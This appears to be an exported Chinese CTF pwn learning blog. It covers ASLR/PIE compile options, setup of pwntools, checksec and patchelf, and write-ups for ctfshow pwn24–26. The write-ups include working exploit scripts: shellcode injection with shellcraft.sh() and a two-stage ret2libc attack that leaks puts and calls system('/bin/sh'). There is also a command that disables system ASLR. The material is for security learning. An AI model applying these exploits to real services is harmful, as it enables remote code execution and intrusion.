<p>我没看懂怎么对PIE进行编译控制，这里引用后者博客的内容。<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c				      // 默认情况下看系统，一般是开到2</span><br><span class="line">gcc -fpie -pie -o test test.c		// 开启PIE，此时强度为1</span><br><span class="line">gcc -fPIE -pie -o test test.c		// 开启PIE，此时为最高强度2</span><br><span class="line">gcc -fpic -o test test.c		    // 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c		    // 开启PIC，此时为最高强度2，不会开启PIE</span><br></pre></td></tr></table></figure></p>
<h2 id="最后，ASLR和PIE、PIE的异同点总结"><a href="#最后，ASLR和PIE、PIE的异同点总结" class="headerlink" title="最后，ASLR和PIE、PIE的异同点总结"></a>最后，ASLR和PIE、PIE的异同点总结</h2><ul>
<li>异同点：<ul>
<li>同：他们都代表着地址随机化的技术。</li>
<li>异：他们层次不同，一个是系统层次的功能，另两个是编译器给出的选项，技术细节也可能有所不同。</li>
</ul>
</li>
<li>他们能同时开吗？当然可以，也就是（ASLR+PIE/ASLR+PIC）这样子的。<ul>
<li>原先ASLR早于PIE出现，有return-to-plt、got hijack、stack-pivot(bypass stack ransomize)等绕过ASLR的技术，而在ASLR+PIE之后，这些bypass技术就都失效了，只能借助其他的信息泄露漏洞泄露基址（常用libc基址）。</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>知识点</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>PIE</tag>
        <tag>ASLR</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具1 pwntools模块</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B71-pwntools%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><ul>
<li><code>pwntools</code>的安装</li>
<li><code>pwntools</code>的组件</li>
</ul>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="pwntools的安装"><a href="#pwntools的安装" class="headerlink" title="pwntools的安装"></a><code>pwntools</code>的安装</h2><p><code>pwntools</code>是基于python的一个包，我们可以用<code>pip install</code>来安装这个包。</p>
<p>坑：在 Manjaro 22、Ubuntu 23.04、Fedora 38等最新的linux发行版中运行<code>pip install</code>时，通常会收到一个错误提示：<code>error: externally-managed-environment</code>，即“外部管理环境”错误，但这不是一个 bug。</p>
<p>解决办法：</p>
<ol>
<li>直接去除警告。<strong>缺点是包装多了可能会产生混乱</strong></li>
<li>使用<code>pipx</code>，<strong>缺点是这个只适用于命令行，脚本中无法使用import引用包</strong></li>
<li>使用<code>venv</code>创建虚拟环境。（我选择为pwn单独建一个环境）<ul>
<li><code>apt install python3-venv</code></li>
<li><code>python3 -m venv 目录</code>，该指令会在目录中创建一个python虚拟环境。</li>
<li>进入虚拟环境所在的目录，使用<code>source bin/activate</code>来进入虚拟环境，然后<code>pip install</code>即可正常使用。</li>
<li>关闭当前shell或使用<code>deactivate</code>即可退出虚拟环境。</li>
</ul>
</li>
</ol>
<p>总之大费周章最后终于装完了。</p>
<h2 id="pwntools的组件"><a href="#pwntools的组件" class="headerlink" title="pwntools的组件"></a><code>pwntools</code>的组件</h2><p>命令行中输入<code>pwn</code>可以看到pwntools中包括的工具。<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">asm,checksec,constgrep,cyclic,debug,disasm,disablenx,elfdiff,elfpatch,errno,hex,libcdb,phd,pwnstrip,scramble,shellcraft,template,unhex</span><br></pre></td></tr></table></figure></p>
<h3 id="checksec工具"><a href="#checksec工具" class="headerlink" title="checksec工具"></a><code>checksec</code>工具</h3><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-checksec/" title="pwn工具3 checksec">checksec介绍</a>
<h3 id="cyclic工具"><a href="#cyclic工具" class="headerlink" title="cyclic工具"></a><code>cyclic</code>工具</h3><a href="/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/" title="ctfshow-pwn25 WP">使用cyclic的实践-ctfshow-pwn25(ret2libc)</a>
<h3 id="shellcraft工具"><a href="#shellcraft工具" class="headerlink" title="shellcraft工具"></a><code>shellcraft</code>工具</h3><a href="/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/" title="ctfshow-pwn24 WP">使用shellcraft的实践-ctfshow-pwn24(ret2text)</a>
<h3 id="源代码中的ELF-quot-xxx-quot-函数"><a href="#源代码中的ELF-quot-xxx-quot-函数" class="headerlink" title="源代码中的ELF(&quot;./xxx&quot;)函数"></a>源代码中的<code>ELF(&quot;./xxx&quot;)</code>函数</h3><p>这里面抓出来的地址其实不是运行出来的，而是反汇编出来的。就跟<code>objdump -S xxx</code>中对应的地址是一样的。</p>
<h3 id="敬请期待，还没用到"><a href="#敬请期待，还没用到" class="headerlink" title="敬请期待，还没用到"></a>敬请期待，还没用到</h3>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具3 checksec</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B73-checksec/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文大量参考<a href="https://blog.csdn.net/tabactivity/article/details/126660974">博客1</a>和<a href="https://blog.csdn.net/samlirongsheng/article/details/120431377">博客2</a></p>
<h1 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h1><p>本文主要介绍：工具<code>checksec</code></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="工具checksec"><a href="#工具checksec" class="headerlink" title="工具checksec"></a>工具<code>checksec</code></h2><h3 id="安装checksec"><a href="#安装checksec" class="headerlink" title="安装checksec"></a>安装<code>checksec</code></h3><p><code>checksec</code>可以独立安装，但是<code>pwntools</code>已经将其打包了，其中集成了大量pwn手用的工具，所以我们直接安装<code>pwntools</code>即可</p>
<h3 id="工具checksec的显示"><a href="#工具checksec的显示" class="headerlink" title="工具checksec的显示"></a>工具<code>checksec</code>的显示</h3><p><img src="/image/post/ctf/pwn/tools/003/1.png" alt=""></p>
<center>checksec的显示</center>

<h1 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h1><p>想要进一步查看<code>checksec</code>显示的信息，请继续阅读另一篇文章：<br><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B91-elf%E7%9A%84%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7/" title="pwn知识点1 elf的安全属性">elf的安全属性</a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn工具2 pwngdb</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B72-pwngdb/</url>
    <content><![CDATA[<p>空文章，想做再做。</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具4 readelf</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B74-readelf/</url>
    <content><![CDATA[<p>空文章，想做再做。</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具5 objdump</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B75-objdump/</url>
    <content><![CDATA[<p>空文章，想做再做。</p>
]]></content>
  </entry>
  <entry>
    <title>pwn工具6 patchelf与glibc-all-in-one</title>
    <url>/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B76-patchelf%E4%B8%8Eglibc-all-in-one/</url>
    <content><![CDATA[<h1 id="面临的窘境"><a href="#面临的窘境" class="headerlink" title="面临的窘境"></a>面临的窘境</h1><p>在我做ctfshow的pwn26时，我明明已经设定对了ASLR保护值，但是得不到正确的flag。</p>
<p>关于题目中给出的libc也不会用，于是进行了问题的查询，发现这是一个pwn手经常遇见的问题。</p>
<h1 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h1><h2 id="为什么要下载对应版本的glibc"><a href="#为什么要下载对应版本的glibc" class="headerlink" title="为什么要下载对应版本的glibc"></a>为什么要下载对应版本的glibc</h2><p>这个问题也是开始一直困扰的疑问，为什么不直接使用手头分发的glibc，设置环境变量<code>LD_PRELOAD=./libc.so.6 ./xxx</code>。</p>
<p>直接让加载指定的libc执行，而要去下载一个对应版本的glibc重新编译呢？</p>
<p>因为<code>ld.so</code>与<code>libc.so</code>不匹配可能会导致程序无法运行。</p>
<h2 id="安装及使用glibc-all-in-one"><a href="#安装及使用glibc-all-in-one" class="headerlink" title="安装及使用glibc-all-in-one"></a>安装及使用<code>glibc-all-in-one</code></h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br></pre></td></tr></table></figure>
<h3 id="查看可下载列表"><a href="#查看可下载列表" class="headerlink" title="查看可下载列表"></a>查看可下载列表</h3><p>确保工作目录为<code>glibc-all-in-one</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat list</span><br></pre></td></tr></table></figure></p>
<h3 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h3><p>工作目录为<code>glibc-all-in-one</code><br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./download &#123;你要的版本&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="安装及使用patchelf"><a href="#安装及使用patchelf" class="headerlink" title="安装及使用patchelf"></a>安装及使用<code>patchelf</code></h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>原理：程序相关的<code>libc.so</code>和<code>ld.so</code>是被硬写到程序中的，你可以使用<code>ldd</code>命令查看<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ldd pwn</span><br><span class="line">        linux-vdso.so.1 (0x00007ffe64733000)</span><br><span class="line">        libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x000079835dbaf000) </span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x000079835d800000)// libc c标准语言库</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x000079835dbc8000)// 看到ld 动态连接器</span><br></pre></td></tr></table></figure></p>
<h3 id="patchelf介绍"><a href="#patchelf介绍" class="headerlink" title="patchelf介绍"></a><code>patchelf</code>介绍</h3><p><code>patchelf</code>是一个用于修改ELF可执行文件和库的小型实用程序。它允许用户更改动态链接器（dynamic linker）和 RPATH（运行时搜索路径），从而方便地调整可执行文件和库的运行环境。patchelf 主要用于 Linux 系统，支持多种 ELF 格式的文件。</p>
<p>关键技术：</p>
<ul>
<li><strong>ELF文件格式</strong>：patchelf 主要操作 ELF 格式的可执行文件和库。</li>
<li><strong>动态链接器</strong>：允许用户修改可执行文件的动态链接器。</li>
<li><strong>RPATH</strong>：允许用户修改和调整可执行文件和库的运行时搜索路径。</li>
</ul>
<h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><p>这一套安装流程的讲解：</p>
<ul>
<li><a href="https://blog.csdn.net/SecondJanuary">SecondJanuary(csdn)</a>：<a href="https://blog.csdn.net/secondjanuary/article/details/8985795">Linux下 config/configure/Configure、make 、make test/make check、sudo make install 的作用(csdn)</a></li>
</ul>
<h4 id="克隆项目源码"><a href="#克隆项目源码" class="headerlink" title="克隆项目源码"></a>克隆项目源码</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br></pre></td></tr></table></figure>
<h4 id="生成构建文件"><a href="#生成构建文件" class="headerlink" title="生成构建文件"></a>生成构建文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh</span><br></pre></td></tr></table></figure>
<p>可能会报错：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh: 2: autoreconf: not found</span><br></pre></td></tr></table></figure></p>
<p>进行如下操作：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install autoconf automake libtool</span><br></pre></td></tr></table></figure></p>
<h4 id="配置构建环境"><a href="#配置构建环境" class="headerlink" title="配置构建环境"></a>配置构建环境</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure>
<h4 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br></pre></td></tr></table></figure>
<h4 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make check</span><br></pre></td></tr></table></figure>
<p>check成功只需要没有<code>error</code>。</p>
<h4 id="安装patchelf"><a href="#安装patchelf" class="headerlink" title="安装patchelf"></a>安装<code>patchelf</code></h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
<h3 id="配置和使用"><a href="#配置和使用" class="headerlink" title="配置和使用"></a>配置和使用</h3><h4 id="常用用法"><a href="#常用用法" class="headerlink" title="常用用法"></a>常用用法</h4><ul>
<li><p>修改<code>ld</code>的地址</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter ld_addr file_name</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改libc的地址</p>
<ul>
<li>这里old_libc就是ldd查到的那个ld地址(==&gt;之前)比如：<code>libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</code>那么就是<code>libc.so.6</code><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --replace-needed old_libc new_libc file_name</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li><p>修改Libc的地址(不太稳定)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">patchelf --set-rpath new_rpath your_file</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="大部分功能"><a href="#大部分功能" class="headerlink" title="大部分功能"></a>大部分功能</h4><p>命令行输入<code>patchelf</code>，会得到（部分）：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">syntax: patchelf</span><br><span class="line">  [--set-interpreter FILENAME]</span><br><span class="line">  [--page-size SIZE]</span><br><span class="line">  [--print-interpreter]</span><br><span class="line">  [--print-soname]              Prints &#x27;DT_SONAME&#x27; entry of .dynamic section. Raises an error if DT_SONAME doesn&#x27;t exist</span><br><span class="line">  [--set-soname SONAME]         Sets &#x27;DT_SONAME&#x27; entry to SONAME.</span><br><span class="line">  [--set-rpath RPATH]</span><br><span class="line">  [--remove-rpath]</span><br><span class="line">  [--shrink-rpath]</span><br><span class="line">  [--allowed-rpath-prefixes PREFIXES]           With &#x27;--shrink-rpath&#x27;, reject rpath entries not starting with the allowed prefix</span><br><span class="line">  [--print-rpath]</span><br><span class="line">  [--force-rpath]</span><br><span class="line">  [--add-needed LIBRARY]</span><br><span class="line">  [--remove-needed LIBRARY]</span><br><span class="line">  [--replace-needed LIBRARY NEW_LIBRARY]</span><br><span class="line">  [--print-needed]</span><br><span class="line">  [--no-default-lib]</span><br><span class="line">  [--debug]</span><br><span class="line">  [--version]</span><br><span class="line">  FILENAME</span><br></pre></td></tr></table></figure></p>
<p>翻译后是：</p>
<ul>
<li>设置动态库解析器</li>
<li>设置页大小</li>
<li>设置 DT_SONAME</li>
<li>设置 rpath</li>
<li>删除 rpath</li>
<li>添加允许的 rpath 前缀</li>
<li>打印 rpath</li>
<li>强制使用 rpath</li>
<li>添加需要的动态库</li>
<li>删除需要的动态库</li>
<li>替换旧的动态库为新的</li>
<li>打印帮助信息</li>
<li>不链接默认的动态库</li>
<li>输出调试信息</li>
<li>打印版本号</li>
</ul>
]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-pwn24 WP</title>
    <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn24-WP/</url>
    <content><![CDATA[<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="题面提示"><a href="#题面提示" class="headerlink" title="题面提示"></a>题面提示</h2><p>题目给出提示可以使用shellcraft脚本生成shell。</p>
<h2 id="分析pwn文件"><a href="#分析pwn文件" class="headerlink" title="分析pwn文件"></a>分析pwn文件</h2><p>使用<code>exeinfope</code>查看可执行文件类型。发现是32位elf文件</p>
<p>使用<code>IDA</code>对pwn文件反编译。</p>
<p>看到hint：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint  : NX disabled &amp; Has RWX segments</span><br></pre></td></tr></table></figure></p>
<p>结合题目提示发现可能是ret2text的题型。</p>
<p>进入ctfshow函数中，IDA无法生成该函数的伪代码，其汇编如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">buf= byte ptr -88h</span><br><span class="line">var_4= dword ptr -4</span><br><span class="line"></span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx</span><br><span class="line">sub     esp, 84h</span><br><span class="line">call    __x86_get_pc_thunk_bx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    100h            ; nbytes</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">call    eax</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br></pre></td></tr></table></figure>
<ul>
<li>发现该函数用<code>_read</code>读入了buf字符串，然后用<code>_puts</code>函数输出了buf字符串。</li>
<li><strong>最关键的是：第四个<code>call</code>直接将buf字符串（数据段）当作代码段执行</strong></li>
</ul>
<p>确定是ret2text的题型，现在只需要输入shell执行代码的机器码即可</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28174&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/1.png" alt=""></p>
<center>拿到shell</center>

<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn24-wp/2.png" alt=""></p>
<center>拿到flag</center>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>wp</tag>
        <tag>ret2text</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-pwn25 WP</title>
    <url>/2024/11/12/ctfpwn/wp/ctfshow-pwn25-WP/</url>
    <content><![CDATA[<h1 id="文章简述"><a href="#文章简述" class="headerlink" title="文章简述"></a>文章简述</h1><p>主要探究了问题中偏移量与自己知识中的偏移量不同的原因。</p>
<p>介绍了一种确定偏移量的方法。</p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="对程序进行反编译并找到思路"><a href="#对程序进行反编译并找到思路" class="headerlink" title="对程序进行反编译并找到思路"></a>对程序进行反编译并找到思路</h2><h3 id="exeinfope"><a href="#exeinfope" class="headerlink" title="exeinfope"></a>exeinfope</h3><p>使用exeinfope查看程序，发现是elf32位程序。</p>
<h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><p>打开ida进行反编译。<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">132</span>]; <span class="comment">// [esp+0h] [ebp-88h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>发现ctfshow函数中有典型的输入溢出风险。</p>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>使用checksec工具查看elf文件信息：</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/checksec.png" alt="checksec结果"></p>
<p>发现打开了NX，不能执行数据段，于是想到ret2libc。</p>
<h2 id="确定偏移量"><a href="#确定偏移量" class="headerlink" title="确定偏移量"></a>确定偏移量</h2><h3 id="疑惑的开始"><a href="#疑惑的开始" class="headerlink" title="疑惑的开始"></a>疑惑的开始</h3><p>我先行查看了<a href="https://blog.csdn.net/weixin_52635170/article/details/131295889">别人的wp</a><br>发现其确定的$offset$是$140$，但是根据我之前的学习（<a href="https://zhuanlan.zhihu.com/p/25816426">有关栈溢出的知乎文章</a>），我认为的$offset$应该为$136(132(buf)+4(ebp))$</p>
<h3 id="使用工具cyclic初步确定偏移量"><a href="#使用工具cyclic初步确定偏移量" class="headerlink" title="使用工具cyclic初步确定偏移量"></a>使用工具cyclic初步确定偏移量</h3><p>使用工具cyclic是借鉴了<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">另一篇wp</a></p>
<p>cyclic是pwngdb内的工具。</p>
<p>使用效果如图</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic1.png" alt="使用cyclic"></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic2.png" alt="使用cyclic"></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/cyclic3.png" alt="使用cyclic"></p>
<p>发现$offset$确为$140$</p>
<h3 id="查明原因"><a href="#查明原因" class="headerlink" title="查明原因"></a>查明原因</h3><p>对程序进行gdb调试。<br>如图（此处是ctfshow()函数调用read()函数的时候，与main()调用ctfshow()同理）</p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/gdb.png" alt="gdb"></p>
<ul>
<li>可能性一：多的那$4$的$offset$是用来存储.got.plt的偏移量。此处偏移量为$0$是因为主函数不同于其他部分，在编译时其.got.plt表和.plt表都已经重定向到了具体位置，不需要再延迟重定向，但仍需要给出偏移量，所以此处偏移量为$0$。（根据<a href="https://zhuanlan.zhihu.com/p/558522498">知乎大佬的文章</a>）</li>
<li><strong>可能性二：（更有可能的是）作为返回值存储的地方。</strong></li>
</ul>
<p>我觉得可能性二更有可能，因为在IDA伪代码中改函数有返回值，且反汇编中最后一步在栈帧即将弹出之前有一步将这个位置的值赋给了寄存器ebx。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>使用pwntools和libcsearcher两个模块给出payload脚本。</p>
<p>思路：先利用ret2libc的思路，转到puts函数输出puts自己的地址，利用puts的地址确定libc动态库版本。<br>再直接调出system()和”/bin/sh”的地址再进行一次ret2libc拿到shell。</p>
<h3 id="思路中必须弄明白的地方"><a href="#思路中必须弄明白的地方" class="headerlink" title="思路中必须弄明白的地方"></a>思路中必须弄明白的地方</h3><ol>
<li><strong>其实两次ret2libc都是在同一个进程内进行的，也必须在一个进程中进行。</strong></li>
<li><strong>因为Linux一般默认开着ASLR。程序重新启动后动态库的地址会重新随机一次，导致前面获得的<code>puts</code>函数的实际地址无意义。</strong></li>
</ol>
<p><strong>所以我们进行了设计：</strong></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/payload.png" alt=""></p>
<center>我们应该构造的payload样式</center>

<ul>
<li>来自<a href="https://blog.csdn.net/Bossfrank">Boss_frank(csdn)</a>：<a href="https://blog.csdn.net/Bossfrank/article/details/134872403">pwn入门：基本栈溢出之ret2libc详解（以32位+64位程序为例）(csdn)</a>的图和讲解</li>
</ul>
<p><strong>为什么我们这么设计payload？</strong></p>
<p><img src="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/stack.png" alt=""></p>
<center>帧栈分布</center>

<ul>
<li>来自<a href="/image/post/ctf/pwn/wp/ctfshow-pwn25-wp/payload.png">山深有杏（腾讯云）</a>：<a href="https://cloud.tencent.com/developer/article/2384856">PWN从入门到放弃(7)——栈溢出之ret2libc（腾讯云）</a></li>
</ul>
<p><strong>我们通过构造<code>payload = offset * b&#39;a&#39; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</code>这样的payload来实现多次进入main函数从而多次输入多次溢出的目的。</strong></p>
<p>而且，从这部分引用的第二篇博客（腾讯云的），其中的题目不是先调用<code>ctfshow()</code>这样的函数，第二次的<code>offset</code>甚至和第一次还不一样，这题还算比较基础。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="string">&quot;28216&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">140</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_v = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc_v.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + libc_v.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc_v.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = offset * <span class="string">b&#x27;a&#x27;</span> + p32(system_addr) + p32(main_addr) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>ctf</category>
        <category>pwn</category>
        <category>wp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>pwn</tag>
        <tag>wp</tag>
        <tag>ret2libc</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow pwn26-31 WP</title>
    <url>/2024/11/14/ctfpwn/wp/ctfshow-pwn26-31-WP/</url>
    <content><![CDATA[<h1 id="前置知识和工具"><a href="#前置知识和工具" class="headerlink" title="前置知识和工具"></a>前置知识和工具</h1><ul>
<li><a href="/2024/11/14/ctfpwn/knowledge/pwn%E7%9F%A5%E8%AF%86%E7%82%B92-ASLR-PIE%E5%92%8CPIC%E7%9A%84%E5%BC%82%E5%90%8C/" title="pwn知识点2 ASLR,PIE和PIC的异同">ASLR、PIE和PIC</a></li>
<li><a href="/2024/11/14/ctfpwn/tools/pwn%E5%B7%A5%E5%85%B76-patchelf%E4%B8%8Eglibc-all-in-one/" title="pwn工具6 patchelf与glibc-all-in-one">更换elf动态运行库的方法</a>
</li>
</ul>
<p>关于pwn26-28:——<del>尽管我操作了很久也搞不出题目的flag，最后都抄了别人的flag</del></p>
<h1 id="pwn26"><a href="#pwn26" class="headerlink" title="pwn26"></a>pwn26</h1><p>修改ASLR设置代码如下：<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</span><br></pre></td></tr></table></figure><br>再运行pwn可执行文件，得到flag：<br><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ctfshow&#123;0x400687_0x400560_0x603260_0x7ffff7fd64f0&#125;</span><br></pre></td></tr></table></figure></p>
